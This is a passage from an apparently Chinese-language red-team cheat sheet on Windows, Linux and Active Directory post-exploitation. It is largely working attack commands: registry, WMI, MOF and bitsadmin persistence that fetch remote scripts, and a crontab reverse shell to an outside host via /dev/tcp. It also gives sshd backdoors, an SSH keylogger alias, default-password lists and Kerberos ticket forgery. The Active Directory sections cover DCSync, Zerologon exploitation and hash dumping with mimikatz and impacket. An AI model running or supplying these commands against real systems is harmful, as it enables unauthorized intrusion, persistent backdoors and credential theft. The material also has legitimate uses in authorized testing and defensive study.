获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。
Linux 下 openssh 后门 
重新编译运行的sshd服务，用于记录用户的登陆密码。
##### 2、常用的存储Payload位置 
**WMI** :
存储：
```
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_Command'
$StaticClass.Put()
$StaticClass.Properties.Add('Command' , $Payload)
$StaticClass.Put() 
```
读取:
```
$Payload=([WmiClass] 'Win32_Command').Properties['Command'].Value
```

**包含数字签名的PE文件**
利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名 
**特殊ADS** 
…
```
type putty.exe > ...:putty.exe
wmic process call create c:\test\ads\...:putty.exe
```
特殊COM文件
```
type putty.exe > \\.\C:\test\ads\COM1:putty.exe
wmic process call create \\.\C:\test\ads\COM1:putty.exe
```
磁盘根目录
```
type putty.exe >C:\:putty.exe 
wmic process call create C:\:putty.exe
```
##### 3、Run/RunOnce Keys  
用户级 
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```
管理员 
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
```
##### 4、BootExecute Key 
由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：
```
HKLM\SYSTEM\CurrentControlSet\Control\hivelist
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager
```
##### 5、Userinit Key 
WinLogon进程加载的login scripts,具体键值：
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```
##### 6、Startup Keys 
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
```
##### 7、Services 
创建服务 
```
sc create [ServerName] binPath= BinaryPathName
```
##### 8、Browser Helper Objects 
本质上是Internet Explorer启动时加载的DLL模块
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects
```
##### 9、AppInit_DLLs 
加载User32.dll会加载的DLL
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
```
##### 10、文件关联 
```
HKEY_LOCAL_MACHINE\Software\Classes
HKEY_CLASSES_ROOT
```
##### 11、[bitsadmin](http://www.liuhaihua.cn/archives/357579.html) 
```
bitsadmin /create backdoor
bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe
bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://host.com/calc.sct scrobj.dll"
bitsadmin /Resume backdoor
```
##### 12、[mof ](https://evi1cg.me/archives/Powershell_MOF_Backdoor.html)
```
pragma namespace("\\\\.\\root\\subscription") 
instance of __EventFilter as $EventFilter
{
EventNamespace = "Root\\Cimv2";
Name = "filtP1";
Query = "Select * From __InstanceModificationEvent "
"Where TargetInstance Isa \"Win32_LocalTime\" "
"And TargetInstance.Second = 1";
QueryLanguage = "WQL";
}; 
instance of ActiveScriptEventConsumer as $Consumer
{
Name = "consP1";
ScriptingEngine = "JScript";
ScriptText = "GetObject(\"script:https://host.com/test\")";
}; 
instance of __FilterToConsumerBinding
{
Consumer = $Consumer;
Filter = $EventFilter;
};
```
管理员执行：
```
mofcomp test.mof
```
##### 13、[wmi](https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe) 

每隔60秒执行一次notepad.exe
```
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="C:\Windows\System32\notepad.exe",CommandLineTemplate="C:\Windows\System32\notepad.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""
```
##### 14、[Userland Persistence With Scheduled Tasks](https://3gstudent.github.io/Userland-registry-hijacking)  
劫持计划任务UserTask，在系统启动时加载dll
```
function Invoke-ScheduledTaskComHandlerUserTask
{
[CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
Param (
[Parameter(Mandatory = $True)]
[ValidateNotNullOrEmpty()]
[String]
$Command,

[Switch]
$Force
)
$ScheduledTaskCommandPath = "HKCU:\Software\Classes\CLSID\{58fb76b9-ac85-4e55-ac04-427593b1d060}\InprocServer32"
if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
New-Item $ScheduledTaskCommandPath -Force |
New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
}else{
Write-Verbose "Key already exists, consider using -Force"
exit
}

if (Test-Path $ScheduledTaskCommandPath) {
Write-Verbose "Created registry entries to hijack the UserTask"
}else{
Write-Warning "Failed to create registry key, exiting"
exit
} 
}
Invoke-ScheduledTaskComHandlerUserTask -Command "C:\test\testmsg.dll" -Verbose
```
##### 15、[Netsh](https://3gstudent.github.io/Netsh-persistence) 
```
netsh add helper c:\test\netshtest.dll
```
后门触发：每次调用netsh
>dll编写:https://github.com/outflanknl/NetshHelperBeacon

##### 16、[Shim](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims) 
常用方式：
InjectDll
RedirectShortcut
RedirectEXE
##### 17、[DLL劫持](https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95)
通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程
使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行
工具：https://github.com/sensepost/rattler
工具：https://github.com/Yonsm/AheadLib
##### 18、[DoubleAgent ](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D))
编写自定义Verifier provider DLL
通过Application Verifier进行安装
注入到目标进程执行payload
每当目标进程启动，均会执行payload，相当于一个自启动的方式
POC : https://github.com/Cybellum/DoubleAgent
##### 19、[waitfor.exe ](https://3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence)
不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe
POC : https://github.com/3gstudent/Waitfor-Persistence
##### 20、[AppDomainManager](https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence) 
针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制
##### 21、Office 
[劫持Office软件的特定功能](https://3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8):通过dll劫持,在Office软件执行特定功能时触发后门
[利用VSTO实现的office后门](https://3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8)
[Office加载项](https://github.com/3gstudent/Office-Persistence)
* Word WLL 
* Excel XLL 
* Excel VBA add-ins 
* PowerPoint VBA add-ins

>参考1 ：https://3gstudent.github.io/Use-Office-to-maintain-persistence

>参考2 ：https://3gstudent.github.io/Office-Persistence-on-x64-operating-system


##### 22、[CLR](https://3gstudent.github.io/Use-CLR-to-maintain-persistence)
无需管理员权限的后门，并能够劫持所有.Net程序
POC:https://github.com/3gstudent/CLR-Injection
##### 23、[msdtc](https://3gstudent.github.io/Use-msdtc-to-maintain-persistence) 
利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测
利用：向 %windir%\system32\目录添加dll并重命名为oci.dll
##### 24、[Hijack CAccPropServicesClass and MMDeviceEnumerato](https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator) 
利用COM组件，不需要重启系统，不需要管理员权限
通过修改注册表实现
POC：https://github.com/3gstudent/COM-Object-hijacking 
##### 25、[Hijack explorer.exe](https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe)
COM组件劫持，不需要重启系统，不需要管理员权限
通过修改注册表实现
```
HKCU\Software\Classes\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}
HKCU\Software\Classes\CLSID{fbeb8a05-beee-4442-804e-409d6c4515e9}
HKCU\Software\Classes\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}
HKCU\Software\Classes\Wow6432Node\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E}
```
##### 26、Windows FAX DLL Injection 
通过DLL劫持，劫持Explorer.exe对`fxsst.dll`的加载
Explorer.exe在启动时会加载`c:\Windows\System32\fxsst.dll`(服务默认开启，用于传真服务)将payload.dll保存在`c:\Windows\fxsst.dll`，能够实现dll劫持，劫持Explorer.exe对`fxsst.dll`的加载
##### 27、特殊注册表键值 
在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。

[《渗透技巧——"隐藏"注册表的创建》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA)

[《渗透技巧——"隐藏"注册表的更多测试》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95)
##### 28、快捷方式后门 
替换我的电脑快捷方式启动参数
POC : https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1
##### 29、[Logon Scripts](https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence) 
```
New-ItemProperty "HKCU:\Environment\" UserInitMprLogonScript -value "c:\test\11.bat" -propertyType string | Out-Null
```
##### 30、[Password Filter DLL](https://3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8) 
##### 31、[利用BHO实现IE浏览器劫持](https://3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81) 

#### Linux 
##### crontab 
每60分钟反弹一次shell给dns.wuyun.org的53端口
```
#!bash
(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/dns.wuyun.org/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
```
##### 硬链接sshd 
```
#!bash
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;
```
链接：ssh root@192.168.206.142 -p 2333
##### SSH Server wrapper 
```
#!bash
cd /usr/sbin
mv sshd ../bin
echo '#!/usr/bin/perl' >sshd
echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd
echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
chmod u+x sshd
//不用重启也行
/etc/init.d/sshd restart
```
```
socat STDIO TCP4:192.168.206.142:22,sourceport=13377
```
##### SSH keylogger 
vim当前用户下的.bashrc文件,末尾添加
```
#!bash
alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh'
```
source .bashrc
##### Cymothoa_进程注入backdoor 
```
./cymothoa -p 2270 -s 1 -y 7777
```
```
nc -vv ip 7777
```
##### rootkit

* [openssh_rootkit](http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz)
* [Kbeast_rootkit ](http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz)
* Mafix + Suterusu rootkit

##### Tools

* [Vegile ](https://github.com/Screetsec/Vegile)
* [backdoor ](https://github.com/icco/backdoor)

### WEB后门

PHP Meterpreter后门 
Aspx Meterpreter后门 
weevely 
webacoo  
....

## 横向渗透
### 端口渗透 
#### 端口扫描 
* 1.端口的指纹信息（版本信息） 
* 2.端口所对应运行的服务  
* 3.常见的默认端口号  
* 4.尝试弱口令 

####  端口爆破 
[hydra ](https://github.com/vanhauser-thc/thc-hydra)
#### 端口弱口令 
* NTScan  
* Hscan  
* 自写脚本 

#### 端口溢出 
**smb**
* ms08067 
* ms17010 
* ms11058 
* ... 

**apache**
**ftp** 
**...**

#### 常见的默认端口  
##### 1、web类(web漏洞/敏感目录)  
第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix ...
```
80 web 
80-89 web 
8000-9090 web 
```
##### 2、数据库类(扫描弱口令)  
```
1433 MSSQL 
1521 Oracle 
3306 MySQL 
5432 PostgreSQL 
50000 DB2
```
##### 3、特殊服务类(未授权/命令执行类/漏洞)  
```
443 SSL心脏滴血 
445 ms08067/ms11058/ms17010等 
873 Rsync未授权 
5984 CouchDB http://xxx:5984/_utils/ 
6379 redis未授权 
7001,7002 WebLogic默认弱口令，反序列 
9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 
11211 memcache未授权访问 
27017,27018 Mongodb未授权访问 
50000 SAP命令执行 
50070,50030 hadoop默认端口未授权访问 
```
##### 4、常用端口类(扫描弱口令/端口爆破)  
```
21 ftp 
22 SSH 
23 Telnet 
445 SMB弱口令扫描 
2601,2604 zebra路由，默认密码zebra 
3389 远程桌面 
```
##### 5、端口合计所对应的服务  
```
21 ftp 
22 SSH 
23 Telnet 
25 SMTP 
53 DNS 
69 TFTP 
80 web 
80-89 web 
110 POP3 
135 RPC 
139 NETBIOS 
143 IMAP 
161 SNMP 
389 LDAP 
443 SSL心脏滴血以及一些web漏洞测试 
445 SMB 
512,513,514 Rexec 
873 Rsync未授权 
1025,111 NFS 
1080 socks 
1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 
1433 MSSQL (暴力破解) 
1521 Oracle:(iSqlPlus Port:5560,7778) 
2082/2083 cpanel主机管理系统登陆 （国外用较多） 
2222 DA虚拟主机管理系统登陆 （国外用较多） 
2601,2604 zebra路由，默认密码zebra 
3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 
3306 MySQL （暴力破解） 
3312/3311 kangle主机管理系统登陆 
3389 远程桌面 
3690 svn 
4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 
4848 GlassFish web中间件 弱口令:admin/adminadmin 
5432 PostgreSQL 
5900 vnc 
5984 CouchDB http://xxx:5984/_utils/ 
6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 
6379 redis未授权 
7001,7002 WebLogic默认弱口令，反序列 
7778 Kloxo主机控制面板登录 
8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 
8080 tomcat/WDCd/ 主机管理系统，默认弱口令 
8080,8089,9090 JBOSS 
8081 Symantec AV/Filter for MSE 
8083 Vestacp主机管理系统 （国外用较多） 
8649 ganglia 
8888 amh/LuManager 主机管理系统默认端口 
9000 fcgi fcig php执行 
9043 websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager 
9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 
10000 Virtualmin/Webmin 服务器虚拟主机管理系统 
11211 memcache未授权访问 
27017,27018 Mongodb未授权访问 
28017 mongodb统计页面 
50000 SAP命令执行 
50060 hadoop 
50070,50030 hadoop默认端口未授权访问
```
### 域渗透 
#### 信息搜集 
##### powerview.ps1 
```
Get-NetDomain - gets the name of the current user's domain
Get-NetForest - gets the forest associated with the current user's domain
Get-NetForestDomains - gets all domains for the current forest
Get-NetDomainControllers - gets the domain controllers for the current computer's domain
Get-NetCurrentUser - gets the current [domain\]username
Get-NetUser - returns all user objects, or the user specified (wildcard specifiable)
Get-NetUserSPNs - gets all user ServicePrincipalNames
Get-NetOUs - gets data for domain organization units
Get-NetGUIDOUs - finds domain OUs linked to a specific GUID
Invoke-NetUserAdd - adds a local or domain user
Get-NetGroups - gets a list of all current groups in the domain
Get-NetGroup - gets data for each user in a specified domain group
Get-NetLocalGroups - gets a list of localgroups on a remote host or hosts
Get-NetLocalGroup - gets the members of a localgroup on a remote host or hosts
Get-NetLocalServices - gets a list of running services/paths on a remote host or hosts
Invoke-NetGroupUserAdd - adds a user to a specified local or domain group
Get-NetComputers - gets a list of all current servers in the domain
Get-NetFileServers - get a list of file servers used by current domain users
Get-NetShare - gets share information for a specified server
Get-NetLoggedon - gets users actively logged onto a specified server
Get-NetSessions - gets active sessions on a specified server
Get-NetFileSessions - returned combined Get-NetSessions and Get-NetFiles
Get-NetConnections - gets active connections to a specific server resource (share)
Get-NetFiles - gets open files on a server
Get-NetProcesses - gets the remote processes and owners on a remote server
```
PowerView-2.0-tricks:
```
https://gist.github.com/HarmJ0y/3328d954607d71362e3c
```
PowerView-3.0-tricks
```
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
```
##### BloodHound

**获取某OU下所有机器信息**
```
{
            "name": "Find the specificed OU computers",
            "queryList": [
                {
                    "final": false,
                    "title": "Select a OU...",
                    "query": "MATCH (n:OU) RETURN distinct n.name ORDER BY n.name DESC"
                },
                {
                    "final": true,
                    "query": "MATCH (m:OU  {name: $result}) with m MATCH p=(o:OU {objectid: m.objectid})-[r:Contains*1..]->(n:Computer) RETURN p",
                    "allowCollapse": true,
                    "endNode": "{}"
                }
            ]
        }
```

**自动标记owned用户及机器**

[SyncDog](https://github.com/Lz1y/SyncDog)


##### 获取域内DNS信息
* [adidnsdump](https://github.com/dirkjanm/adidnsdump)
* [域渗透——DNS记录的获取](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96)
​            
#### 获取域控的方法 
##### SYSVOL 
SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。 
相关阅读: 
* [寻找SYSVOL里的密码和攻击GPP（组策略偏好） ](http://www.freebuf.com/vuls/92016.html)
* [Windows Server 2008 R2之四管理Sysvol文件夹 ](http://blog.51cto.com/ycrsjxy/203095)
* [SYSVOL中查找密码并利用组策略首选项 ](https://adsecurity.org/?p=2288)
* [利用SYSVOL还原组策略中保存的密码](https://xz.aliyun.com/t/1653) 

##### MS14-068 Kerberos 
```
python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机
```
利用mimikatz将工具得到的TGT_domainuser@SERVER.COM.ccache写入内存，创建缓存证书：
```
mimikatz.exe "kerberos::ptc c:TGT_darthsidious@pentest.com.ccache" exit
net use k: \pentest.comc$
```
相关阅读 :
* [Kerberos的工具包PyKEK](http://adsecurity.org/?p=676) 
* [深入解读MS14-068漏洞](http://www.freebuf.com/vuls/56081.html)
* [Kerberos的安全漏洞](https://adsecurity.org/?p=541) 

##### SPN扫描 
Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。
SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。
SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。
相关阅读 :
* [非扫描式的SQL Server发现](https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning/) 
* [SPN扫描](https://adsecurity.org/?p=1508) 
* [扫描SQLServer的脚本](https://github.com/PyroTek3/PowerShell-AD-Recon) 

##### Kerberos的黄金门票 
在域上抓取的哈希
```
lsadump::dcsync /domain:pentest.com /user:krbtgt
```
```
kerberos::purge
kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 /ticket:adinistrator.kiribi
kerberos::ptt administrator.kiribi
kerberos::tgt
net use k: \pnet use k: \pentest.comc$
```
相关阅读 :
* https://adsecurity.org/?p=1640 
* [域服务账号破解实践](http://bobao.360.cn/learning/detail/3564.html) 
* [Kerberos的认证原理](https://blog.csdn.net/wulantian/article/details/42418231) 
* [深刻理解windows安全认证机制ntlm＆Kerberos](https://klionsec.github.io/2016/08/10/ntlm-kerberos/) 

##### Kerberos的银票务
黄金票据和白银票据的一些区别：
Golden Ticket：伪造`TGT`，可以获取`任何Kerberos`服务权限
银票：伪造TGS，`只能访问指定的服务`
加密方式不同：
Golden Ticket由`krbtgt`的hash加密
Silver Ticket由`服务账号`（通常为计算机账户）Hash加密
认证流程不同：
金票在使用的过程需要同域控通信
银票在使用的过程不需要同域控通信
相关阅读 :
* [攻击者如何使用Kerberos的银票来利用系统](https://adsecurity.org/?p=2011) 
* [域渗透——Pass The Ticket](https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.pdf)

##### 域服务账号破解 
与上面SPN扫描类似的原理
https://github.com/nidem/kerberoast
获取所有用作SPN的帐户
```
setspn -T PENTEST.com -Q */*
```
从Mimikatz的RAM中提取获得的门票
```
kerberos::list /export
```
用rgsrepcrack破解
```
tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
##### 凭证盗窃 
从搜集的密码里面找管理员的密码 

##### NTLM relay
 * [One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
 * [privexchange](https://github.com/dirkjanm/privexchange/)
 * [Exchange2domain](https://github.com/ridter/exchange2domain)

##### Kerberos委派
 * [Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
 * [s4u2pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
 * [Attacking Kerberos Delegation](https://xz.aliyun.com/t/2931)
 * [用打印服务获取域控](https://adsecurity.org/?p=4056)
 * [Computer Takeover](https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/)
 * [Combining NTLM Relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
 * [CVE-2019-1040](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)

##### 地址解析协议 
实在搞不定再搞ARP 
##### Zerologon 
1、利用Mimikatz
**check**
```
lsadump::zerologon /target:dc1.exploit.local /account:dc1$
```
**exploit**
```
lsadump::zerologon /target:dc1.exploit.local /account:dc1$ /exploit
```
**dcsync**
```
lsadump::dcsync /dc:dc1.exploit.local /authuser:dc1$ /authdomain:exploit.local /authpassword:"" /domain:exploit.local /authntlm /user:krbtgt
```
**restore**
```
lsadump::postzerologon /target:conttosson.locl /account:dc$ 
```
2、利用impacket：
* 取目标主机名+IP
* install 修改版本的impacket
* Exp

```
python cve-2020-1472-exploit.py DC2008 10.211.55.200
```
![](https://blogpics-1251691280.file.myqcloud.com/imgs/20200916190137.png)
```
secretsdump.py -no-pass cgdomain.com/'DC2008$'@10.211.55.200 -history -just-dc-user administrator
```
```
secretsdump.py -no-pass cgdomain.com/administrator@10.211.55.200 -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae
```
![](https://blogpics-1251691280.file.myqcloud.com/imgs/20200916190359.png)

获取到旧的密码明文hex，还原
```
python restorepassword.py cgdomain.com/DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b
```
![](https://blogpics-1251691280.file.myqcloud.com/imgs/20200916190457.png)


恢复方法2
通过wmic, pass the hash 拿到域控制器中的本地管理员权限(域管)
```
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local/Administrator@10.211.55.38
```
然后分别执行,拷贝本机中SAM数据库到本地
```
- reg save HKLM\SYSTEM system.save
- reg save HKLM\SAM sam.save
- reg save HKLM\SECURITY security.save
- get system.save
- get sam.save
- get security.save
- del /f system.save
- del /f sam.save
- del /f security.save
```

提取明文hash
```
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```
然后恢复。
​    
#### 获取AD哈希 
* 使用VSS卷影副本 
* Ntdsutil中获取NTDS.DIT​​文件 
* PowerShell中提取NTDS.DIT -->[Invoke-NinaCopy ](https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy)
* 使用Mimikatz提取 

```
mimikatz lsadump::lsa /inject exit 
```
* 使用PowerShell Mimikatz
* 使用Mimikatz的DCSync 远程转储Active Directory凭证
提取 KRBTGT用户帐户的密码数据：

```
Mimikatz "privilege::debug" "lsadump::dcsync /domain:rd.adsecurity.org /user：krbtgt"exit
```
管理员用户帐户提取密码数据：
```
Mimikatz "privilege::debug" "lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator" exit

```
* NTDS.dit中提取哈希 
使用esedbexport恢复以后使用ntdsxtract提取 

#### AD持久化 
##### 活动目录持久性技巧 
https://adsecurity.org/?p=1929 
DS恢复模式密码维护 
DSRM密码同步 
>Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)

[DCshadow ](https://www.dcshadow.com/)

##### Security Support Provider 
简单的理解为SSP就是一个DLL，用来实现身份认证
```
privilege::debug
misc::memssp
```
这样就不需要重启`c:/windows/system32`可看到新生成的文件kiwissp.log
##### [SID History](https://adsecurity.org/?p=1772) 
SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户
```
mimikatz "privilege::debug" "misc::addsid bobafett ADSAdministrator"
```
##### [AdminSDHolder＆SDProp ](https://adsecurity.org/?p=1906)
利用AdminSDHolder＆SDProp（重新）获取域管理权限 
##### 组策略 
https://adsecurity.org/?p=2716 
[策略对象在持久化及横向渗透中的应用](https://www.anquanke.com/post/id/86531) 
##### Hook PasswordChangeNotify 
http://www.vuln.cn/6812

##### Kerberoasting后门
[域渗透-Kerberoasting](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting)

##### AdminSDHolder
[Backdooring AdminSDHolder for Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

##### Delegation
[Unconstrained Domain Persistence](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence)

#### 其他
##### 域内主机提权
[SharpAddDomainMachine](https://github.com/Ridter/SharpAddDomainMachine
)
##### Exchange的利用
* [**Exchange2domain**](https://github.com/Ridter/Exchange2domain)
* [**CVE-2018-8581**](https://github.com/WyAtu/CVE-2018-8581/)
* [**CVE-2019-1040**](https://github.com/Ridter/CVE-2019-1040) 
* [**CVE-2020-0688**](https://github.com/Ridter/CVE-2020-0688)
* [**NtlmRelayToEWS**](https://github.com/Arno0x/NtlmRelayToEWS)
* [**ewsManage**](https://github.com/3gstudent/ewsManage)
* [**CVE-2021-26855**](https://github.com/h4x0r-dz/CVE-2021-26855)
* [**CVE-2021-28482**](https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda)

#### TIPS 
